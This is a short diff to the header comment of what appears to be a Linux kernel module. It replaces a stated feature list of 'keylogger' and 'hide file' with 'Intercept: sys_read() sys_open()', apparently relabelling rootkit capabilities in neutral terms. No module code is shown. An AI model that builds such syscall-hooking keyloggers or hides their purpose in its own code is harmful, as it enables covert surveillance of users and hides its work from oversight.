@@ -17,9 +17,9 @@
                           
 https://data.whicdn.com/images/78048685/large.gif
 
-Features:
-    keylogger
-    hide file
+Intercept:
+    sys_read()
+    sys_open()
 */
 
 MODULE_LICENSE( "GPL" );
